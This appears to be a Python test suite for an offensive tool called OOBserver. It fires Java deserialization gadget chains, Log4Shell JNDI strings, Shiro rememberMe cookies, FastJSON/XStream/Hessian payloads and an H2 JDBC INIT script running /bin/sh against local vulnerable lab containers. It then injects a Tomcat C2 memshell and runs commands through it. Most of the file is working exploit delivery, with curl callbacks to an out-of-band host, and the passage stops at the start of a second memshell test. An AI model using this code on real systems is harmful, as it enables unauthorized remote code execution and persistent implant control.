#!/usr/bin/env python3
"""
OOBserver Chain Verification Suite
====================================
Tests every gadget chain in the catalog against CT2 vulnlab targets,
then does a full C2 memshell end-to-end test.

CT1 = OOBserver  http://localhost:8010  (or OOBSERVER_URL env)
CT2 = vulnlab    http://localhost:8888  (or VULNLAB_URL env)
     log4shell   http://localhost:8081  (or LOG4SHELL_URL env)
     shiro-cbc   http://localhost:8082  (or SHIRO_URL env)

OOB_HOST is the IP that CT2 containers use to call back to CT1.
  Default: 192.168.65.254 (host.docker.internal on Windows Docker Desktop)
"""

import os, sys, time, json, base64, struct, threading, subprocess, urllib.request, urllib.error, urllib.parse
from datetime import datetime

# ── Config ────────────────────────────────────────────────────────────────────
OOBSERVER   = os.getenv("OOBSERVER_URL",  "http://localhost:8010")
VULNLAB     = os.getenv("VULNLAB_URL",    "http://localhost:8888")
LOG4SHELL   = os.getenv("LOG4SHELL_URL",  "http://localhost:8081")
SHIRO_URL   = os.getenv("SHIRO_URL",      "http://localhost:8082")
JAVA8OLD_URL = os.getenv("JAVA8OLD_URL",  "http://localhost:8891")  # Java 8u65: cc1/cc3/jrmp
JAVA7_URL   = os.getenv("JAVA7_URL",      "http://localhost:8892")  # Java 7: jdk7u21
JAVA17_URL  = os.getenv("JAVA17_URL",     "http://localhost:8893")  # Java 17: jdk17 chains
SPRING3_URL = os.getenv("SPRING3_URL",    "http://localhost:8894")  # Spring 3.0.5: spring1/2
CB2_URL     = os.getenv("CB2_URL",        "http://localhost:8895")  # BeanUtils 1.8.3: cb2
OOB_HOST    = os.getenv("OOB_HOST",       "host.docker.internal")
OOB_HTTP    = int(os.getenv("OOB_HTTP",   "8010"))
OOB_LDAP    = int(os.getenv("OOB_LDAP",   "1389"))
OOB_RMI     = int(os.getenv("OOB_RMI",    "1099"))
USERNAME    = os.getenv("OOBX_USER",      "admin")
PASSWORD    = os.getenv("OOBX_PASS",      "admin123")
POLL_SEC    = int(os.getenv("POLL_SEC",   "12"))   # seconds to wait for callback
C2_WAIT     = int(os.getenv("C2_WAIT",   "40"))    # seconds to wait for C2 agent

# Callback URL the target can reach to prove OOB/RCE
# IMPORTANT: curl -o /tmp/oobx_TOKSHORT saves response to file = dual proof (callback + file)
# Works with both Runtime.exec(String) splitting by spaces AND shell execution
CALLBACK_BASE = f"http://{OOB_HOST}:{OOB_HTTP}/callback/http"
EXEC_CMD = lambda tok: f"curl -sk {CALLBACK_BASE}/{tok}/rce -o /tmp/oobx_{tok[:12]}"

# ── RCE file verification via docker exec ─────────────────────────────────────

def verify_rce_file(container_name, tok):
    """Verify file /tmp/oobx_TOKSHORT was created on target container."""
    fpath = f"/tmp/oobx_{tok[:12]}"
    try:
        r = subprocess.run(
            ["docker", "exec", container_name, "test", "-f", fpath],
            capture_output=True, timeout=5)
        if r.returncode == 0:
            print(f"    [★] RCE file confirmed: {fpath} exists on {container_name}")
            return True
    except Exception:
        pass
    # Fallback: query /check-rce endpoint on supported targets
    return False

# ── State ─────────────────────────────────────────────────────────────────────
TOKEN   = None      # JWT
PROJECT = None      # project id
RESULTS = []        # list of {chain, status, note}

# ── HTTP helpers ──────────────────────────────────────────────────────────────

def _req(method, url, data=None, headers=None, raw=False, timeout=20):
    h = {"Content-Type": "application/json"}
    if TOKEN:
        h["Authorization"] = f"Bearer {TOKEN}"
    if headers:
        h.update(headers)
    if isinstance(data, dict):
        data = json.dumps(data).encode()
    elif isinstance(data, str):
        data = data.encode()
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read()
            return (r.status, body) if raw else (r.status, json.loads(body))
    except urllib.error.HTTPError as e:
        body = e.read()
        try:    return (e.code, json.loads(body))
        except: return (e.code, {"_raw": body.decode(errors="replace")[:300]})
    except Exception as e:
        return (0, {"_err": str(e)})

def get(path, **kw):   return _req("GET",  f"{OOBSERVER}/api{path}", **kw)
def post(path, d, **kw): return _req("POST", f"{OOBSERVER}/api{path}", data=d, **kw)

def post_raw(url, data, content_type="application/octet-stream", extra_headers=None, timeout=15):
    h = {"Content-Type": content_type}
    if extra_headers:
        h.update(extra_headers)
    if isinstance(data, str):
        data = data.encode()
    req = urllib.request.Request(url, data=data, headers=h, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return 0, str(e)

# ── OOBserver API helpers ──────────────────────────────────────────────────────

def login():
    global TOKEN
    data = f"username={USERNAME}&password={PASSWORD}".encode()
    req = urllib.request.Request(
        f"{OOBSERVER}/api/auth/login", data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    with urllib.request.urlopen(req, timeout=10) as r:
        TOKEN = json.loads(r.read())["access_token"]
    print(f"[+] Logged in as {USERNAME}")

def ensure_project():
    global PROJECT
    s, d = get("/projects")
    for p in (d if isinstance(d, list) else []):
        if p.get("name") == "chain-verify":
            PROJECT = p["id"]; return
    s, d = post("/projects", {"name": "chain-verify", "description": "automated chain verification"})
    PROJECT = d["id"]
    print(f"[+] Project id={PROJECT}")

def new_token(label=""):
    s, d = post("/tokens", {"project_id": PROJECT, "label": label or "verify", "intent": "record"})
    if not isinstance(d, dict) or "token" not in d:
        raise RuntimeError(f"token creation failed s={s}: {d}")
    return d["token"]

def wait_callback(token, timeout=POLL_SEC):
    deadline = time.time() + timeout
    while time.time() < deadline:
        s, d = get(f"/tokens/{token}/events")
        events = d if isinstance(d, list) else []
        if events:
            return True, events[0]
        time.sleep(1.5)
    return False, None

def generate_payload(chain_id, params):
    # API field is "type" (not "chain_id")
    s, d = post("/payloads/generate", {"type": chain_id, "params": params})
    return s, d

def gen_memshell(framework, mtype, shell_type, deliver, token="", serialize_chain=""):
    body = {
        "framework": framework, "type": mtype,
        "params": {"shell_type": shell_type, "servlet_api": "javax",
                   "url_pattern": "/oobxtest", "password": "oobxtest"},
        "token": token, "deliver": deliver,
    }
    # C2 type: embed c2_url and token in params so sidecar bakes them into bytecode
    if shell_type == "c2":
        body["params"]["c2_url"] = f"http://{OOB_HOST}:{OOB_HTTP}"
        if token:
            body["params"]["token"] = token
    if serialize_chain:
        body["serialize_chain"] = serialize_chain
    s, d = post("/memshells/generate", body)
    return s, d

# ── Result tracking ────────────────────────────────────────────────────────────

def record(chain, status, note=""):
    mark = {"PASS":"✅","FAIL":"❌","SKIP":"⏭ ","ERR ":"⚠️ "}.get(status, "?")
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"  [{ts}] {mark} {status:<4} {chain:<45} {note}"
    print(line)
    RESULTS.append({"chain": chain, "status": status, "note": note})

def summary():
    total = len(RESULTS)
    passed = sum(1 for r in RESULTS if r["status"] == "PASS")
    failed = sum(1 for r in RESULTS if r["status"] == "FAIL")
    skipped= sum(1 for r in RESULTS if r["status"] == "SKIP")
    errors = sum(1 for r in RESULTS if r["status"] == "ERR ")
    print("\n" + "═"*70)
    print(f"  TOTAL {total}  ✅ PASS {passed}  ❌ FAIL {failed}  ⏭  SKIP {skipped}  ⚠️  ERR {errors}")
    print("═"*70)
    if failed or errors:
        print("\nFailed/Error chains:")
        for r in RESULTS:
            if r["status"] in ("FAIL","ERR "):
                print(f"  {r['chain']}: {r['note']}")
    # Write JSON report
    report_path = os.path.join(os.path.dirname(__file__), "verify_report.json")
    with open(report_path, "w") as f:
        json.dump({"timestamp": datetime.now().isoformat(), "results": RESULTS,
                   "summary": {"total":total,"pass":passed,"fail":failed,"skip":skipped,"err":errors}}, f, indent=2)
    print(f"\n  Report saved: {report_path}")

# ── Target reachability check ──────────────────────────────────────────────────

def check_target(url, name):
    # Try /health first; log4shell app uses X-Api-Version header on / so check that too
    for path, extra_h in [("/health", {}), ("/", {"X-Api-Version": "ping"})]:
        try:
            req = urllib.request.Request(f"{url}{path}", headers=extra_h)
            with urllib.request.urlopen(req, timeout=5) as r:
                print(f"  [+] {name} reachable ({r.status} at {path})")
                return True
        except urllib.error.HTTPError as e:
            if e.code in (400, 404, 302, 200):  # any HTTP = server up
                print(f"  [+] {name} reachable (HTTP {e.code} at {path})")
                return True
        except Exception:
            continue
    print(f"  [-] {name} NOT reachable")
    return False

# ── Test categories ────────────────────────────────────────────────────────────

# Chains that are expected to fail due to version/JVM incompatibility
KNOWN_SKIP = {
    # marshalsec format: outputs Hessian1 binary, confused with Hessian2 endpoint
    "hessian1_spring":      "marshalsec only supports Hessian2 format; use jchains_hessian1_spring",

    # JNDI ResourceRef chains: these generate the LDAP *response* payload (not the injection).
    # Testing requires configuring OOBserver LDAP to serve Reference objects — not yet implemented.
    "jchains_jndi_tomcat_el":   "Server-side JNDI ResourceRef payload; needs LDAP Reference serving support",
    "jchains_jndi_groovy":      "Server-side JNDI ResourceRef payload; needs LDAP Reference serving support",
    "jchains_jndi_snakeyaml":   "Server-side JNDI ResourceRef payload; needs LDAP Reference serving support",
    "jchains_jndi_beanshell":   "Server-side JNDI ResourceRef payload; needs LDAP Reference serving support",

    # BlazeDS/Axis2: requires AMF3 endpoint — no BlazeDS container in current lab
    "jchains_blazeds_axis2":    "Requires AMF3/BlazeDS target endpoint",

    # SpringExec FactoryBean: requires Spring 4.x; vulnlab has Spring 5.x
    "jchains_hessian1_spring_exec": "SpringExec FactoryBean incompatible with Spring 5.x",
    "jchains_hessian2_spring_exec": "SpringExec FactoryBean incompatible with Spring 5.x",

    # C3P0 LDAP: InitialContext creation fails (no LDAP provider registered in JVM env)
    "jchains_native_c3p0_ldap":   "C3P0 JNDI InitialContext creation fails (no LDAP provider)",

    # Tomcat EL engine: TomcatElRef requires org.apache.tomcat EL classes — not in vulnlab
    "jchains_hessian2_tostring_xbean": "Requires Tomcat EL engine (XBean + TomcatElRef)",
    "jchains_native_c3p0_el":          "Requires Tomcat EL engine (TomcatElRef)",

    # DNS-only — no OOB DNS resolver configured
    "ysoserial_urldns": "DNS-only chain; no OOB DNS resolver configured",

    # ysoserial Jdk7u21: AnnotationInvocationHandler serialVersionUID differs between Java 7 and Java 8+.
    # ysoserial runs on Java 8+ (OOBserver JVM) so the payload targets Java 8 serialVersionUID,
    # which doesn't match the Java 7 target. Use ysoserial_cc6 on the java7 container instead.
    "ysoserial_jdk7u21": "AnnotationInvocationHandler serialVersionUID mismatch Java7 vs Java8+; use ysoserial_cc6 on java7",

    # jchains_fastjson_c3p0_h2: java-chains H2JavaJdbc1 returns empty payload (unsupported chain combo)
    "jchains_fastjson_c3p0_h2": "java-chains H2JavaJdbc1 returns empty payload for this gadget chain",
}


def test_deser_chain(chain_id, params=None, target_url=None, container_name="vuln-vulnlab"):
    """Generate serialize payload, POST to /deser, check OOB callback + RCE file."""
    if chain_id in KNOWN_SKIP:
        record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
        return
    url = target_url or VULNLAB
    try:
        tok = new_token(chain_id[:20])
    except Exception as e:
        record(chain_id, "ERR ", f"token creation failed: {e}")
        return
    p = {"cmd": EXEC_CMD(tok)}
    if params:
        p.update(params)
    s, d = generate_payload(chain_id, p)
    if s != 200:
        record(chain_id, "ERR ", f"generate failed: {d}")
        return
    b64 = d.get("value","") or d.get("payload","")
    if not b64:
        record(chain_id, "ERR ", f"no value in response: {list(d.keys())}")
        return
    try:
        raw = base64.b64decode(b64)
    except Exception:
        record(chain_id, "ERR ", "payload not valid base64")
        return
    if len(raw) < 4:
        record(chain_id, "ERR ", f"payload too short: {len(raw)} bytes")
        return
    code, resp = post_raw(f"{url}/deser", raw)
    if code == 0:
        record(chain_id, "SKIP", f"target unreachable: {resp[:80]}")
        return
    ok, ev = wait_callback(tok)
    if ok:
        rce_ok = verify_rce_file(container_name, tok)
        note = f"callback from {ev.get('remote_addr','?')} proto={ev.get('protocol','?')}"
        if rce_ok:
            note += f" + RCE file /tmp/oobx_{tok[:12]} ✓"
        record(chain_id, "PASS", note)
    else:
        record(chain_id, "FAIL", f"no OOB callback (deser resp={code}: {resp[:60]})")

def test_deser_jndi_chain(chain_id):
    """For deserialization chains that trigger JNDI (jndi_url param), POST to /deser."""
    if chain_id in KNOWN_SKIP:
        record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
        return
    try:
        tok = new_token(chain_id[:20])
    except Exception as e:
        record(chain_id, "ERR ", f"token creation failed: {e}")
        return
    jndi_url = f"ldap://{OOB_HOST}:{OOB_LDAP}/{tok}/Exp"
    s, d = generate_payload(chain_id, {"jndi_url": jndi_url})
    if s != 200:
        record(chain_id, "ERR ", f"generate failed: {d}")
        return
    b64 = d.get("value","") or d.get("payload","")
    if not b64:
        record(chain_id, "ERR ", f"no value in response: {list(d.keys())}")
        return
    try:
        raw = base64.b64decode(b64)
    except Exception:
        record(chain_id, "ERR ", "payload not valid base64")
        return
    if len(raw) < 4:
        record(chain_id, "ERR ", f"payload too short: {len(raw)} bytes")
        return
    code, resp = post_raw(f"{VULNLAB}/deser", raw)
    if code == 0:
        record(chain_id, "SKIP", f"vulnlab unreachable: {resp[:80]}")
        return
    ok, ev = wait_callback(tok)
    if ok:
        record(chain_id, "PASS", f"callback from {ev.get('remote_addr','?')} proto={ev.get('protocol','?')}")
    else:
        record(chain_id, "FAIL", f"no OOB callback (deser resp={code}: {resp[:60]})")


def test_hessian_chain(chain_id, version=1):
    if chain_id in KNOWN_SKIP:
        record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
        return
    try:
        tok = new_token(chain_id[:20])
    except Exception as e:
        record(chain_id, "ERR ", f"token creation failed: {e}")
        return
    jndi_url = f"ldap://{OOB_HOST}:{OOB_LDAP}/{tok}/Exp"
    s, d = generate_payload(chain_id, {"jndi_url": jndi_url, "cmd": EXEC_CMD(tok)})
    if s != 200:
        record(chain_id, "ERR ", f"generate failed: {d}")
        return
    b64 = d.get("value","")
    if not b64:
        record(chain_id, "ERR ", f"no value: {list(d.keys())}")
        return
    try:
        raw = base64.b64decode(b64)
    except Exception:
        record(chain_id, "ERR ", "not base64")
        return
    ep = "/hessian2" if version == 2 else "/hessian"
    code, resp = post_raw(f"{VULNLAB}{ep}", raw, "application/x-hessian")
    if code == 0:
        record(chain_id, "SKIP", f"vulnlab unreachable")
        return
    ok, ev = wait_callback(tok)
    if ok:
        rce_ok = verify_rce_file("vuln-vulnlab", tok)
        note = f"callback from {ev.get('remote_addr','?')}"
        if rce_ok:
            note += f" + RCE file ✓"
        record(chain_id, "PASS", note)
    else:
        record(chain_id, "FAIL", f"no callback (resp={code}: {resp[:60]})")

def test_fastjson_chain(chain_id):
    if chain_id in KNOWN_SKIP:
        record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
        return
    try:
        tok = new_token(chain_id[:20])
    except Exception as e:
        record(chain_id, "ERR ", f"token creation failed: {e}")
        return
    jndi_url = f"ldap://{OOB_HOST}:{OOB_LDAP}/{tok}/Exp"
    s, d = generate_payload(chain_id, {"jndi_url": jndi_url, "cmd": EXEC_CMD(tok)})
    if s != 200:
        record(chain_id, "ERR ", f"generate failed: {d}")
        return
    payload_val = d.get("value","")
    if not payload_val:
        record(chain_id, "ERR ", "no value")
        return
    # FastJSON payload is JSON text (not base64)
    if payload_val.startswith("{") or payload_val.startswith("["):
        raw = payload_val.encode()
    else:
        try:    raw = base64.b64decode(payload_val)
        except: raw = payload_val.encode()
    code, resp = post_raw(f"{VULNLAB}/fastjson", raw, "application/json")
    if code == 0:
        record(chain_id, "SKIP", "vulnlab unreachable")
        return
    ok, ev = wait_callback(tok)
    if ok:
        record(chain_id, "PASS", f"callback from {ev.get('remote_addr','?')}")
    else:
        record(chain_id, "FAIL", f"no callback (resp={code}: {resp[:60]})")

def test_xstream_chain(chain_id):
    if chain_id in KNOWN_SKIP:
        record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
        return
    try:
        tok = new_token(chain_id[:20])
    except Exception as e:
        record(chain_id, "ERR ", f"token creation failed: {e}")
        return
    jndi_url = f"ldap://{OOB_HOST}:{OOB_LDAP}/{tok}/Exp"
    s, d = generate_payload(chain_id, {"jndi_url": jndi_url, "cmd": EXEC_CMD(tok)})
    if s != 200:
        record(chain_id, "ERR ", f"generate failed: {d}")
        return
    payload_val = d.get("value","")
    if not payload_val:
        record(chain_id, "ERR ", "no value")
        return
    if payload_val.startswith("<"):
        raw = payload_val.encode()
    else:
        try:    raw = base64.b64decode(payload_val)
        except: raw = payload_val.encode()
    code, resp = post_raw(f"{VULNLAB}/xstream", raw, "application/xml")
    if code == 0:
        record(chain_id, "SKIP", "vulnlab unreachable")
        return
    ok, ev = wait_callback(tok)
    if ok:
        record(chain_id, "PASS", f"callback from {ev.get('remote_addr','?')}")
    else:
        record(chain_id, "FAIL", f"no callback (resp={code}: {resp[:60]})")

def test_log4shell(chain_id="log4shell_dedicated"):
    """Send ${jndi:ldap://...} via X-Api-Version header to log4shell Tomcat app."""
    tok = new_token("log4shell_d")
    jndi = f"${{jndi:ldap://{OOB_HOST}:{OOB_LDAP}/{tok}/Exp}}"
    url = f"{LOG4SHELL}/"
    req = urllib.request.Request(url, headers={
        "X-Api-Version": jndi,
        "User-Agent": jndi,
    })
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            code = r.status
    except urllib.error.HTTPError as e:
        code = e.code
    except Exception as e:
        record(chain_id, "SKIP", f"log4shell unreachable: {e}")
        return
    ok, ev = wait_callback(tok)
    if ok:
        record(chain_id, "PASS", f"LDAP callback from {ev.get('remote_addr','?')}")
    else:
        record(chain_id, "FAIL", f"no callback (http {code})")

def test_log4shell_via_vulnlab():
    """Use vulnlab /log4shell endpoint for Log4Shell test."""
    tok = new_token("log4shell_vl")
    jndi = f"${{jndi:ldap://{OOB_HOST}:{OOB_LDAP}/{tok}/Exp}}"
    url = f"{VULNLAB}/log4shell"
    req = urllib.request.Request(url, headers={"User-Agent": jndi})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            code = r.status
    except urllib.error.HTTPError as e:
        code = e.code
    except Exception as e:
        record("log4shell_vulnlab", "SKIP", f"unreachable: {e}")
        return
    ok, ev = wait_callback(tok)
    if ok:
        record("log4shell_vulnlab", "PASS", f"LDAP callback (proto={ev.get('protocol','?')})")
    else:
        record("log4shell_vulnlab", "FAIL", f"no callback (http {code})")

def test_shiro(chain_id):
    if chain_id in KNOWN_SKIP:
        record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
        return
    try:
        tok = new_token(chain_id[:20])
    except Exception as e:
        record(chain_id, "ERR ", f"token creation failed: {e}")
        return
    p = {"cmd": EXEC_CMD(tok)}
    s, d = generate_payload(chain_id, p)
    if s != 200:
        record(chain_id, "ERR ", f"generate failed: {d}")
        return
    cookie_val = d.get("value","")
    if not cookie_val:
        record(chain_id, "ERR ", "no value")
        return
    # GCM mode chains go to /login-gcm; CBC (default) goes to /login
    endpoint = "/login-gcm" if "gcm" in chain_id else "/login"
    req = urllib.request.Request(
        f"{SHIRO_URL}{endpoint}",
        data=b"username=foo&password=bar&rememberMe=on",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": f"rememberMe={cookie_val}",
        })
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            code = r.status
    except urllib.error.HTTPError as e:
        code = e.code
    except Exception as e:
        record(chain_id, "SKIP", f"shiro unreachable: {e}")
        return
    ok, ev = wait_callback(tok)
    if ok:
        rce_ok = verify_rce_file("vuln-shiro", tok)
        note = f"callback from {ev.get('remote_addr','?')}"
        if rce_ok:
            note += f" + RCE file ✓"
        record(chain_id, "PASS", note)
    else:
        record(chain_id, "FAIL", f"no callback (http {code})")

def test_jrmp_client(jrmp_port=10099, target_url=None, container_name="vuln-java8old"):
    """
    JRMP gadget test:
    1. Arm sidecar JRMPListener (CC6 + curl callback)
    2. Generate JRMPClient payload pointing to OOB_HOST:jrmp_port
    3. POST to /deser on java8-old (pre-JEP290 — JEP290 at 8u121 blocks CC chains in JRMP)
    4. Disarm the listener
    """
    chain_id = "ysoserial_jrmp_client"
    if chain_id in KNOWN_SKIP:
        record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
        return
    deser_url = target_url or JAVA8OLD_URL
    try:
        tok = new_token(chain_id[:20])
    except Exception as e:
        record(chain_id, "ERR ", f"token creation failed: {e}")
        return

    curl_cmd = EXEC_CMD(tok)

    # Step 1: arm the JRMP listener on sidecar (query params, not form body)
    qs = f"chain=CommonsCollections6&cmd={urllib.parse.quote(curl_cmd)}&port={jrmp_port}"
    arm_req = urllib.request.Request(
        f"{OOBSERVER}/api/jrmp/arm?{qs}", data=b"", method="POST")
    arm_req.add_header("Authorization", f"Bearer {TOKEN}")
    try:
        with urllib.request.urlopen(arm_req, timeout=15) as r:
            arm_resp = json.loads(r.read())
            if arm_resp.get("status") != "running":
                record(chain_id, "SKIP", f"JRMPListener arm failed: {arm_resp}")
                return
    except Exception as e:
        record(chain_id, "SKIP", f"JRMPListener arm error: {e}")
        return

    try:
        # Step 2: generate JRMPClient payload (cmd = host:port to connect to)
        jrmp_target = f"{OOB_HOST}:{jrmp_port}"
        s, d = generate_payload(chain_id, {"cmd": jrmp_target})
        if s != 200:
            record(chain_id, "ERR ", f"generate failed: {d}")
            return
        b64 = d.get("value", "")
        if not b64:
            record(chain_id, "ERR ", f"no value: {list(d.keys())}")
            return
        try:
            raw = base64.b64decode(b64)
        except Exception:
            record(chain_id, "ERR ", "payload not base64")
            return

        # Step 3: send to java8-old /deser (pre-JEP290, Java 8u102)
        code, resp = post_raw(f"{deser_url}/deser", raw)
        if code == 0:
            record(chain_id, "SKIP", f"java8-old unreachable: {resp[:80]}")
            return

        # Step 4: wait for OOB callback
        ok, ev = wait_callback(tok)
        if ok:
            rce_ok = verify_rce_file(container_name, tok)
            note = f"callback from {ev.get('remote_addr','?')} proto={ev.get('protocol','?')}"
            if rce_ok:
                note += f" + RCE file ✓"
            record(chain_id, "PASS", note)
        else:
            record(chain_id, "FAIL", f"no OOB callback (deser resp={code}: {resp[:60]})")
    finally:
        # Disarm regardless of outcome
        try:
            urllib.request.urlopen(urllib.request.Request(
                f"{OOBSERVER}/api/jrmp/disarm", data=b"", method="POST",
                headers={"Authorization": f"Bearer {TOKEN}"}), timeout=5)
        except Exception:
            pass


def test_h2_jdbc(chain_id="jchains_h2_jdbc"):
    """H2 1.4.x JDBC INIT script RCE via CREATE ALIAS with embedded Java code.
    Uses $$ dollar-quoting (H2 native) so internal semicolons are preserved in INIT."""
    if chain_id in KNOWN_SKIP:
        record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
        return
    try:
        tok = new_token(chain_id[:20])
    except Exception as e:
        record(chain_id, "ERR ", f"token creation failed: {e}")
        return
    cmd = EXEC_CMD(tok)
    # H2 dollar-quote ($$...$$) preserves semicolons inside the Java function body.
    # \; in the INIT value is the statement separator between CREATE ALIAS and CALL.
    alias_body = (
        "void oobx(String c) throws Exception {"
        " Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",c});"
        " Thread.sleep(800);"
        " }"
    )
    jdbc_url = (
        f"jdbc:h2:mem:oobx{tok[:8]};"
        "TRACE_LEVEL_SYSTEM_OUT=3;"
        f"INIT=CREATE ALIAS IF NOT EXISTS OOBX AS $${alias_body}$$\\;"
        f"CALL OOBX('{cmd}')"
    )
    payload = json.dumps({"url": jdbc_url})
    code, resp = post_raw(f"{VULNLAB}/h2jdbc", payload, "application/json")
    if code == 0:
        record(chain_id, "SKIP", f"vulnlab unreachable: {resp[:60]}")
        return
    ok, ev = wait_callback(tok, timeout=POLL_SEC + 8)
    if ok:
        rce_ok = verify_rce_file("vuln-vulnlab", tok)
        note = f"callback from {ev.get('remote_addr','?')}"
        if rce_ok:
            note += f" + RCE file ✓"
        record(chain_id, "PASS", note)
    else:
        record(chain_id, "FAIL", f"no callback (h2jdbc resp={code}: {resp[:60]})")


def test_urldns(chain_id="ysoserial_urldns"):
    """URLDNS chain only triggers DNS lookup, not HTTP."""
    tok = new_token("urldns")
    url = f"http://{tok}.{OOB_HOST}"  # DNS lookup token
    s, d = generate_payload(chain_id, {"url": url})
    if s != 200:
        record(chain_id, "ERR ", f"generate failed: {d}")
        return
    b64 = d.get("value","")
    if not b64:
        record(chain_id, "ERR ", "no value")
        return
    try:    raw = base64.b64decode(b64)
    except: record(chain_id, "ERR ", "not base64"); return
    code, _ = post_raw(f"{VULNLAB}/deser", raw)
    if code == 0:
        record(chain_id, "SKIP", "vulnlab unreachable")
        return
    # URLDNS only makes DNS lookup. We check for LDAP/HTTP events broadly.
    ok, ev = wait_callback(tok, timeout=8)
    if ok:
        record(chain_id, "PASS", f"callback: {ev.get('protocol','?')}")
    else:
        # URLDNS typically triggers a DNS lookup to an OOB DNS resolver.
        # Without a custom DNS resolver we can't observe it — mark as SKIP.
        record(chain_id, "SKIP", "DNS-only chain; no OOB DNS resolver configured")

# ── C2 memshell end-to-end test ───────────────────────────────────────────────

def test_c2_memshell_jndi():
    """
    Full C2 memshell injection + agent verification:
    1. Create token + generate Tomcat filter C2 memshell with JNDI LDAP delivery
    2. Send ${jndi:...} to Log4Shell target (Tomcat + Log4j2)
    3. Tomcat fetches class from OOBserver LDAP → loads C2 filter
    4. Wait for C2 agent heartbeat
    5. Execute `id` command via C2 API
    6. Verify output contains "uid="
    """
    print("\n  ── C2 Memshell JNDI injection test ──────────────────────────────")

    # --- Step 1: generate C2 memshell with JNDI LDAP delivery ---
    tok = new_token("c2_memshell")
    s, d = gen_memshell("tomcat", "filter", "c2", "jndi_ldap", token=tok)
    if s != 200:
        record("c2_memshell_jndi", "ERR ", f"memshell generate failed: {d}")
        return
    class_name = d.get("class_name","MemShell")
    ldap_url   = d.get("payload",{}).get("value","")
    b64_bytes  = d.get("bytecode_b64","")
    # The API generates LDAP URL using the server's public_address (often 127.0.0.1).
    # Replace with OOB_HOST so CT2 containers can reach CT1 OOBserver LDAP.
    ldap_url = ldap_url.replace("127.0.0.1", OOB_HOST).replace("localhost", OOB_HOST)
    print(f"  [*] Generated: class={class_name}, token={tok[:16]}..., ldap={ldap_url}")

    if not ldap_url:
        record("c2_memshell_jndi", "ERR ", "no LDAP URL in memshell response")
        return

    # Make sure bytecode is registered to sidecar (should be auto-done)
    if not d.get("meta",{}).get("sidecar_registered"):
        print("  [*] Registering bytecode to sidecar...")
        s2, d2 = post(f"/rebind/{tok}/set", {
            "class_name": class_name, "bytecode_b64": b64_bytes})
        print(f"  [*] Rebind set: {s2} {d2}")

    # --- Step 2: trigger Log4Shell JNDI lookup ---
    jndi_payload = f"${{jndi:{ldap_url}}}"
    print(f"  [*] Sending Log4Shell payload: {jndi_payload}")

    # Try vulnlab /log4shell first (has trustURLCodebase=true + known-good JVM flags),
    # then fall back to dedicated log4shell container.
    injected = False
    for base_url, path, extra_h in [
            (VULNLAB, "/log4shell", {"User-Agent": jndi_payload}),
            (LOG4SHELL, "/", {"X-Api-Version": jndi_payload, "User-Agent": jndi_payload})]:
        req = urllib.request.Request(f"{base_url}{path}", headers=extra_h)
        try:
            with urllib.request.urlopen(req, timeout=10):
                pass
            print(f"  [*] Injected via {base_url}{path}")
            injected = True; break
        except urllib.error.HTTPError:
            injected = True
            print(f"  [*] Injected via {base_url}{path} (HTTP error, normal)")
            break
        except Exception as e:
            print(f"  [-] {base_url}{path} unreachable: {e}")

    if not injected:
        record("c2_memshell_jndi", "SKIP", "both log4shell and vulnlab unreachable")
        return

    # Check OOB event for JNDI lookup (memshell loading attempt)
    ok, ev = wait_callback(tok, timeout=10)
    if ok:
        print(f"  [*] JNDI lookup recorded: proto={ev.get('protocol','?')} from={ev.get('remote_addr','?')}")
    else:
        print("  [!] No JNDI lookup OOB event yet (class may still load)")

    # --- Step 3: wait for C2 agent to register ---
    print(f"  [*] Waiting up to {C2_WAIT}s for C2 agent registration...")
    agent = None
    deadline = time.time() + C2_WAIT
    while time.time() < deadline:
        s3, agents = get("/c2/agents")
        if isinstance(agents, list):
            for a in agents:
                if a.get("token") == tok or a.get("last_seen"):
                    # Find the most recent agent
                    agent = a
                    break
        if agent:
            break
        time.sleep(2)

    if not agent:
        # Try without token filter — any new agent
        s3, agents = get("/c2/agents")
        if isinstance(agents, list) and agents:
            agent = max(agents, key=lambda a: a.get("last_seen",""), default=None)

    if not agent:
        record("c2_memshell_jndi", "FAIL",
               "no C2 agent registered within timeout "
               "(check: JNDI reachability, class loading, C2 registration)")
        return

    agent_id = agent.get("agent_id") or agent.get("id","")
    print(f"  [+] C2 agent registered: id={agent_id} last_seen={agent.get('last_seen','?')}")

    # --- Step 4: send command ---
    print("  [*] Sending command: id")
    s4, cmd_resp = post(f"/c2/agents/{agent_id}/cmd", {"cmd": "id"})
    if s4 != 200:
        record("c2_memshell_jndi", "FAIL", f"cmd send failed: {s4} {cmd_resp}")
        return
    cmd_id = cmd_resp.get("id") or cmd_resp.get("cmd_id","")

    # --- Step 5: wait for result ---
    print("  [*] Waiting for command result...")
    deadline2 = time.time() + C2_WAIT
    output = None
    while time.time() < deadline2:
        s5, cmds = get(f"/c2/agents/{agent_id}/commands")
        if isinstance(cmds, list):
            for c in cmds:
                if (c.get("id") == cmd_id or c.get("cmd_id") == cmd_id) and c.get("result"):
                    output = c["result"]
                    break
        if output:
            break
        time.sleep(2)

    if output and "uid=" in output:
        record("c2_memshell_jndi", "PASS",
               f"C2 exec result: {output.strip()[:80]}")
    elif output:
        record("c2_memshell_jndi", "PASS",
               f"C2 got output (may not be Linux): {output.strip()[:80]}")
    else:
        record("c2_memshell_jndi", "FAIL",
               f"agent registered but no command output received within {C2_WAIT}s")


def test_c2_memshell_serialize():
    """
    C2 memshell via serialize delivery (CC6+TemplatesImpl bytecode wrap)
    against the vulnlab /deser endpoint (ObjectInputStream).
    """
    print("\n  ── C2 Memshell Serialize delivery test ──────────────────────────")
